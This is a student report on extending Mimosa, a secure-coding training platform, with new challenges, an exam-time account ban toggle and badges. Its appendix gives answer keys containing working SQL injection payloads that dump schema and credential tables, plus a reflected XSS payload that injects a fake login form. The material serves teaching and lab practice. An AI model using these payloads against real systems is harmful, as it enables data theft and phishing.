Acknowledgements

I would like to express my greatest thanks and appreciation to my
lecturer, Mr. Low Jin Kiat, who guided and assisted me throughout this
module and Kuah Wei Liang who served as a mentor, assisting me whenever
I met with any obstacles. I would also like to thank Mr. Low for this
enjoyable and enriching opportunity to work on Mimosa.

# 1 Introduction

In this Independent Study module, I have been tasked to work on Mimosa,
to essentially improve the system. Considering Mimosa is already in the
"production phase", many things were relatively stable. Hence, there
were challenges in finding areas whereby the system could be enhanced,
but I managed to do so after some discussion with Mr. Low and made the
necessary changes to the system.

This report will discuss some of the areas of improvement that have been
identified and detail the solutions implemented and improvements made.
This report will also present some of the challenges I have faced during
this module and some possible further enhancements to Mimosa.

# 2 Background Information

Mimosa is a system that is developed to serve as a teaching aid and
educational tool for the module -- "Secure Coding". It consists of
various challenges which aims to test the offensive and defensive skills
of students which in turn, teaches students about different
vulnerabilities and inculcates good programming habits in them. Mimosa
was created by an FYP team led by Wei Liang back in 2016 and have since
undergone two major revisions. For this Independent Study module, the
opportunity to work on Mimosa was presented to me and improvements were
made to it in a few different aspects.

# 3 Prerequisites

There are different components which are used to build Mimosa and to
work on Mimosa, one must have at least a basic understanding of all
these components. These prerequisites are as shown below:

> 1\. Java & Java EE
>
> 2\. Spring Boot
>
> 3\. Thymeleaf
>
> 4\. Maven
>
> 5\. MySQL

# 4 Identified Areas for Improvement

## 4.1 Lack of Challenges

As Mimosa has been already utilised in Secure Coding, feedback received
from students noted that there could be more challenges in Mimosa,
especially those relating to the content taught in Term 2 of Secure
Coding which included validation with Regex, authentication and more.
This was a similar sentiment that I held while I was progressing through
the Secure Coding module. I felt that it would a lot more beneficial if
there were more challenges in Mimosa. Hence, it was an area that I
sought to improve while working on the system.

## 4.2 Students Able to Login after Leaving Examination Hall

As Mimosa is used as an examination tool for students in their
Mid-Semestral Examinations, another problem that was raised by Mr. Low
while working with Mimosa as a lecturer is that if students were to
leave the examination hall early, they would still be able to log back
in into their Mimosa account, attempt the questions again or even seek
help from other individuals. Although this would constitute an offence
of cheating, it is hard to detect and track. It would be much better if
they were temporarily banned from entering their Mimosa account until
the examination is over. Hence, allowing lecturers to enforce a
temporary ban on a student's account is a feature that could be added to
improve the system.

## 4.3 Gamification

Another aspect of Mimosa that could be improved was the element of fun
which could be addressed by incorporating game-like elements or
techniques to enhance the system, also known as, gamification. This was
an area brought up by Mr. Low as well as something that I felt while
attempting challenges on Mimosa. Although in the current version of
Mimosa, one can view their ranking in their statistics page, from my
experience, it is not a big gamification feature that plays a huge role
in encouraging students. Especially if the student is not a fast
learner, it would be disheartening to often see a low rank position. It
would be brilliant if other aspects of gamification were implemented in
the system to add an element of fun and better motivate students to work
hard on challenges and learn from them. Hence, to better gamify the
system was an area of improvement for Mimosa. However, the question of
what exactly is an appropriate way to gamify the system beckoned.

# 5 Solutions Implemented

With the identified problems on hand, I proceeded to brainstorm and
research on how I would solve them.

## 5.1 Created More Challenges

For the first issue of lack of challenges, the solution was rather
straightforward which was to create more challenges for the students. I
spent the first term of the Independent Study module familiarising
myself with the Mimosa system and working on new challenges. I created a
total of 10 challenges ranging from various categories -- general,
access control, SQLi, XSS, validation and regex. Regarding challenges
relating to content taught in Secure Coding Term 2, I created the 3
regex challenges.

> Figure 1: [Email Validation Regex Challenge]{.underline}

Unfortunately, due to my lack of experience with the components used to
build Mimosa and the time I had to spend on familiarising myself with
the system, I had a lesser amount of time to work on the challenges as
well as I had to spend longer periods of time coding challenges. Because
of this, I did not create as many Mimosa challenges for Term 2 than I
initially had planned. In the future, challenges related to logging, JWT
tokens and more can be created.

## 5.2 Added a Checkbox on the Students' Statistics Page

By inspecting the users table in the MySQL, it can be seen that there is
a field known as 'enabled' and is of TINYINT(1) type (Boolean). By
looking at SecurityConfig.java file in Mimosa, it can be seen that JDBC
Authentication is used, and the enabled will be checked to be true
before allowing the user to proceed on to subsequent pages. Thus, by
toggling the enabled field of each user from '1' to '0' or vice versa,
the user can be banned or allowed accordingly. With this, I added a
button in the statistics page for different batches as shown below.

> Figure 2: [Button to Toggle User\'s Enabled Status]{.underline}

With a click on the button, the lecturer or administrator can toggle a
user's enabled status. This is easy to use as the lecturer or
invigilator in charge can simply browse to this page for the specific
class and according to the students who leave the class early,
temporarily ban them from logging back into Mimosa.

## 5.3 Badge System

Regarding the implementation of a game-like element into Mimosa, I
underwent much research and brainstorming. There were different
possibilities of doing and after much consideration, I decided to
implement a badge system whereby students will be able to earn badges
upon completion of certain tasks. This method has been known to be a
classic and effective way to motivate users. Awarding badges to users
taps into two of the core human drives of accomplishment and reward
(Shannon, 2021). An example where gamification with badges was applied
successfully is in TripAdvisor which is a travel platform with much of
its content being user-generated such as reviews and pictures. As user
content is of much importance to TripAdvisor, it uses a gamified
approach to encourage users to post reviews, photos, and ratings by
awarding users with badges according to their contributions and it is
effective in motivating users to contribute (Bucher, 2015). Another
example is how the Nike+Run application awards badges to users when they
accomplish certain tasks (Fitz Walter, 2021). The figure below shows an
example of the badges in the Nike+Run application.

> Figure 3: [Badges in Nike+Run Application]{.underline}

After deciding to implement a badge system, another concern was what
kind of badges would Mimosa award students as it is important to choose
the right criteria to award users such that the gamification approach
will be effective. If Mimosa awards the users too frequently, the badges
will no longer invoke a feeling of excitement or accomplishment when
awarded and users would simply feel indifferent. Conversely, if badges
were rarely awarded, users will feel unmotivated. After consideration
and discussing with Mr. Low, I have decided to implement three types of
badges.

> 2\. Completed their first challenge from a certain category
>
> 3\. Completed X number of challenges where X can be configured by the
> lecturer/administrator (Rank Badge)

A sample of the three different types of badges are shown below.

> Figure 4: [Types of Badges in Mimosa]{.underline}

Upon perfect completion of a challenge, Mimosa will query the database
to check whether the user that completed the challenge is the first in
his/her class to complete, whether it is the first challenge he/she has
completed in a particular category and whether the user has completed a
certain number of challenges to reach a new rank. If the user is deemed
to have achieved a certain badge, a notification will appear to inform
the user and the badge will be assigned to the user.

> Figure 5: [Notification that a New Badge is Achieved]{.underline}

The user is then able to view his/her badges in the dashboard or
statistics page.

> Figure 6: [User\'s Badges Displayed in Dashboard]{.underline}

## 5.4 Configuration of Badges

While implementing the badge system, Mr. Low has raised the idea of
allowing administrators to tweak the criteria for the rank badges. This
is to allow adjustments to be made to suit the abilities of the students
as well as the number of challenges that are assigned to the students. I
felt that this was a good idea and went ahead to implement this in the
configuration page for the badges. This page allows the administrator to
add a new challenge to be included for the "first in class to complete a
challenge" badge and the criteria to be met to achieve certain ranks. As
a new challenge is added, it can be decided by the administrator whether
users should receive a badge if they are the first in their class to
complete that challenge (For examination challenges, administrators may
not want users to earn that badge). This can be done by simply inputting
the challenge url into the input box as shown below. When submitted,
Mimosa will create a new badge with the template and the name supplied.
It will also create a new entry in the badges table in the database.

> Figure 7: [Input Box to Enter Challenge URL]{.underline}

As for the rank badges, the number of challenges to be completed by the
user before a certain rank badge is achieved can be configured by the
administrator/lecturer. This can be done by changing the values in the
form as shown in the figure below. Similarly, when the values are
modified, Mimosa will create a new badge with the template and the
values supplied.

> Figure 8: [Form to Modify Criteria for Rank Badges]{.underline}

# 6 Modifications to the System

In the process of implementing the solutions, I had to make
modifications to the system -- adding new files or editing certain
files. These modifications are listed in this section.

## 6.1 Creating New Challenges

To create the new challenges, I had to add their respective challenge
controllers and html pages. In some cases, additional scripts were
needed, and I had to create the js files. For example, for the "Forgot
Password" challenges, I had to create 3 files:

> \- ForgotPasswordChallengeController.java
> (src\\main\\java\\securecoding\\controller\\challenges\\accesscontrol)
>
> \- forgot-password.html
> (src\\main\\resources\\templates\\pages\\challenges)
>
> \- forgot-password.js
> (src\\main\\resources\\static\\js\\pages\\challenges)

## 6.2 Allowing the Toggling of Users' Enabled Status

> To add the toggle button, I had to modify the statistics.html
> (src\\main\\resources\\templates\\pages\\batches) page to add the
> button for each user row in the table as shown below.
>
> Figure 9: [Toggle Button in statistics.html Page]{.underline}
>
> The post request will be handled by the UserController
> (src\\main\\java\\securecoding\\controller\\management) and it
> essentially searches the repository for the particular user with the
> username supplied, set its enabled field to the opposite of what it
> already is and updates that user in the repository. The codes are as
> shown below.
>
> Figure 10: [Endpoint in UserController.java]{.underline}

I also had to implement some js code in the statistics.js
(src\\main\\resources\\static\\js\\pages\\batches) file to notify the
user regarding the outcome of the form submission and also to submit the
form on change of the button.

> Figure 11: [Script in statistics.js]{.underline}

## 6.3 Implementing Badge System

Regarding the badge system and the admin functionality to configure the
badges, it was slightly more complicated. I first created two model
classes: Badge.java (src\\main\\java\\securecoding\\model) and
Unlock.java (src\\main\\java\\securecoding\\model). The Badge class has
a Many-to-Many relationship with the User class as a user can have many
badges and many users can have the same badge. The Unlock class has a
Many-to-One relationship with the User class and a Many-to-One
relationship with the Badge class. I need to explicitly define the
Unlock class as I need to access the "dateAttained" property in the
class.

> Figure 12: [Badge.java and Unlock.java]{.underline}

Subsequently, I created the respective repository classes for them as
shown below to provide Mimosa with the CRUD and other operations needed.

> Figure 13: [BadgeRepository.java and
> UnlockRepository.java]{.underline}

As for the checking of the criteria before awarding the badges, I
enforced the checks in the ChallengeControllerAdapter.java
(src\\main\\java\\securecoding\\controller\\template) for whenever the
user completes a challenge with perfect score as shown below.

> Figure 14: [Checking if User has Achieved a New Badge]{.underline}

To allow for better readability, I have placed the codes which carry out
the checks in another file -- UnlockUtil.java
(src\\main\\java\\securecoding\\util). Basically, the checkRank function
will check if the user's number of attempts reaches that of any rank,
the checkFirstCat will check if the user has previously completed a
challenge of that category yet and the checkFirstCompletion will check
if the user is the first in his/her batch (class) to complete the
challenge.

> Figure 15: [UnlockUtil.java]{.underline}

As for the display of the badges, they will be displayed in two pages --
statistics.html (src\\main\\resources\\templates\\pages\\settings) and
dashboard.html (src\\main\\resources\\templates\\pages). I have created
a panel in each of them with a table to display the badges in a single
row.

> Figure 16: [Display of Badges in statistics.html and
> dashboard.html]{.underline}

In order to display the badges, I had to make modifications to their
respective controllers -- SettingsController.java
(src\\main\\java\\securecoding\\controller) and DashboardController.java
(src\\main\\java\\securecoding\\controller), ensuring that the badges
and unlocks are added to the model as attributes before returning the
page to the user a shown below.

> Figure 17: [SettingsController.java and
> DashboardController.java]{.underline}

Lastly, to notify the user, I have made changes to default.js
(src\\main\\resources\\static\\js) such that it would notify the user if
he/she has achieved a new badge.

> Figure 18: [check_badges Function in default.js]{.underline}

# 7 Challenges Faced

Throughout this module, I was faced with various obstacles but
fortunately, I was able to overcome them to hail this project a success.

## 7.1 Zero Knowledge of Important Components of Mimosa

One obstacle was definitely how I had zero knowledge of Java, Java EE,
SpringBoot, Maven and Thymeleaf prior to this module. Because of this, I
had to spend extra time before the start of this module to learn them.
Unfortunately, I was not able to completely learn all of the components
before the semester started and had to spend extra time in the first few
weeks of the module to quickly pick up the rest of required knowledge.
Even after learning the various components, I did not have much
experience with them, and Mimosa was the first project I worked on that
ultilised these. Hence, there were times where I was met with issues
that were foreign to me and I had to spend a considerable amount of time
figuring them out. However, through these challenges, I was able to
better grasp onto the concepts and structure of the different
components. Overall, I am glad that through this module, I was able to
pick up a new programming language and more which will benefit me in the
future.

## 7.2 Juggling with FYP and Others

Another obstacle was how I had to juggle this project with my Final Year
Project (FYP) and other modules. Especially, in Year 3, where we have
our FYP and must prepare for other things such as our internship and
even university, it is extremely packed. This project is almost like a
mini-FYP and thus, it was challenging at times, to juggle this with the
other tasks I had on hand. But by managing my time well, I managed to
persist on and complete this project. Through such stressful times, it
allowed me to grow and emerge stronger.

# 8 Future Enhancements

This project does not mark the final stage of development for Mimosa as
there is still room for enhancements and improvements to the system.
Firstly, as mentioned, more challenges relating to the content taught in
Term 2 of Secure Coding should be added to the system. This would allow
Mimosa to facilitate learning in students throughout the entire semester
of Secure Coding. Secondly, a game-like series of challenges can be
added to Mimosa, something similar to the XSS game hosted on
[[https://xss-game.appspot.com/]{.underline}](https://xss-game.appspot.com/).
This provides a more adventure-based experience which is possibly more
fun for students. Next, another enhancement I originally thought of
working on was the forum feature where students can discuss on topics
relating to Secure Coding or Mimosa itself and even seek help from
lecturers. However, this may bring about distractions for students and
students may even abuse the system whereby they simply post answers to
challenges on the forum, and this would hinder Mimosa's purpose of
educating students. Hence, any individual who decides to implement this
in the future should thread carefully and consider ways to prevent such
negative consequences from occurring. Lastly, a possible enhancement
would be to add the feature of allowing students to upload certain files
and the system would automatically grade it, similar to the Falcon
system.

# 9 Conclusion

To sum up, I identified three areas of improvement -- lack of
challenges, students able to log back in after examinations and
gamification of the system. I addressed these areas by creating 10
challenges, adding a button on the batches statistics page for the
administrator to temporarily ban students and a badge system which
awards various badges to students for completing certain tasks. Overall,
this project was fun and enriching, providing me with the opportunity to
learn many new things and work with a system that will be put into use
for my juniors.

# Appendix

## Challenge Answers

**Forgot Password (Access Control)**

The idea of this challenge is to educate students about choosing and
using weak security questions. If weak security questions are used, the
mechanism which is intended to strengthen the security of the system
would do more harm than good. This challenge is designed such that the
user takes on the persona of a hacker trying to steal Bill Gates
password. As Bill Gates is a well-known figure whom much of his
information can be found online, when the security question is regarding
the daughter of Bill Gates, the student can obtain this information
online.

[Answer:]{.underline}

**Node Compiler Basics Two (General)**

The existing Node Compiler Basics challenge taught students about
writing a GET endpoint on NodeJS, thus, this challenge was created to
teach the students about writing a POST endpoint to enforce some simple
checks on the client's input before responding with a certain status and
message.

[Answer:]{.underline}

**Email Validation (Regex)**

This challenge is to allow students to practise writing regular
expressions and using them to validate user input. In this case, the
student is required to write a regular expression for an SP ichat email
with the username comprising of a minimum of 4 characters and symbols --
"." And "\_" are allowed.

[Answer:]{.underline}

**Password Validation (Regex)**

This challenge is to allow students to practise writing regular
expressions and using them to validate user input. In this case, the
student is required to write a regular expression to validate the
complexity of passwords. The passwords should contain at least one
special character, one digit, one upper and lower case letter, with the
length of the password being within 8-16 characters and with no
whitespaces.

[Answer:]{.underline}

**Regex Basics (Regex)**

This is a simple regex challenge whereby students are required to
validate that the input contains only alphabets and numbers and has at
least a character in it.

**Fakebook (SQLi)\
\
[[https://excalidraw.com/#json=Zn-RxBS2t1ORriKcR7_jE,WVjmn9lMrqJqumxSnAkvcA]{.underline}](https://excalidraw.com/#json=Zn-RxBS2t1ORriKcR7_jE,WVjmn9lMrqJqumxSnAkvcA)**

This challenge is identical to the "Quote Failure" challenge in the
older version of Mimosa with the purpose being to help students
understand how to conduct an SQLi attack without using quotes. The
students are expected to use the concat() function and char() to execute
the SQL injection.

[Answer:]{.underline}

To discover the available schemas in the database:\
\
1 union select null from information_schema.tables\
//1 union select '1' from information_schema.tables

1 union select table_schema from information_schema.tables

1 union select table_name from information_schema.tables

With the available schemas, display the tables inside the schema which
is of interest (public):

1 union select table_name from information_schema.tables where
table_schema=concat(char(112),char(117),char(98),char(108),char(105),char(99))\
(publicâ‡’ 112 117 98 108 105 99 )

Next, to find the columns can be retrieved with:

1 union select column_name from information_schema.columns where
table_name=concat(char(102),char(97),char(107),char(101),char(98),char(111),char(111),char(107))
and table_schema=
concat(char(112),char(117),char(98),char(108),char(105),char(99))

1 union select concat (column_name, char(44), table_name) from
information_schema.columns

1 union select concat (table_name, char(44), column_name) from
information_schema.columns\
\
![](media/image13.png){width="5.234375546806649in"
height="1.9921872265966754in"}

1 union select concat (table_name, char(44), column_name) from
information_schema.columns where
table_name=concat(char(102),char(97),char(107),char(101),char(98),char(111),char(111),char(107))

Next, retrieve the usernames and passwords from the fakebook (Note that
because only one column is displayed to the user, the student is to use
the concat function to display both the username and password in one
column):

1 union select concat(username,char(44),password) from fakebook

Crack the md5 hash for the password of LeonSKennedy with an MD5 cracker

Final answer:

Username = LeonSKennedy

Password = adawong

**Notflix (SQLi)**

In this challenge, the student can search for movies in the search box
but only the Top 3 movies will be shown. So, to conduct an SQLi attack
to obtain the password of Eric Law successfully, the student has to use
the OFFSET clause to allow the application to return different rows.

[Answer:]{.underline}

To obtain the names and their respective schemas of the tables in the
database: (Where X is a number that the student has to increment from 0,
at position 31, "PUBLIC.USERS" will be shown)

4%\' UNION SELECT 1,table_name,table_schema from
information_schema.tables OFFSET X;\-- -

With the table name and schema, the columns in that table can be
retrieved (Where X can be configured to return different rows):

4%\' UNION SELECT 1,table_name,column_name FROM
INFORMATION_SCHEMA.columns WHERE table_name=\'users\' OFFSET X;\-- -

After discovering the two required fields -- username and password, the
username and password of Eric Law can be retrieved (Where X can be
configured to return different user):

4%\' UNION SELECT 1,username,password FROM PUBLIC.users OFFSET X;\-- -

**SQLi Basics Two (SQLi)**

The idea behind this challenge is that the system blacklists any SQL
comments in the input fields and the password field is not vulnerable to
SQLi as passwords are hashed in the database. Because of this, the
student must understand the concept of operator precedence before being
able to carry out the attack successfully.

[Answer:]{.underline}

**Goggle Form (Validation)**

This is a simple challenge whereby it teaches the students how it is
possible to bypass validation checks if they are simply on the
client-side.

[Answer:]{.underline}

To solve this challenge, students have to use Burp-Suite to intercept
the submission of the form and change the values such that they are
invalid data.

**Fakebook Bank (XSS)**

This challenge was extracted from the old version of Mimosa and it is a
simple challenge for students to learn more about XSS. In this
challenge, whatever that is typed into the payee name input box will be
displayed back to the client and the student is supposed to exploit this
to display an alert stating that it is required to login and
subsequently, display a login form on the page.

[Answer:]{.underline}

\<script\>alert(\"Please login\");\</script\>

\<form\>

Username\<input type=text\>

Password\<input type=password\>

\<button onclick=\"alert(\'Login in Successful!\');\"\>Login\</button\>

\</form\>

Another payload:

\<form\>

Username\<input type=text\>

Password\<input type=password\>

\<button onclick=\"alert(\'Login in Successful!\');\"\>Login\</button\>

\</form\>

Pass the marking system

\<form\>

Username\<input type=text\>

Password\<input type=password\>

\</form\>
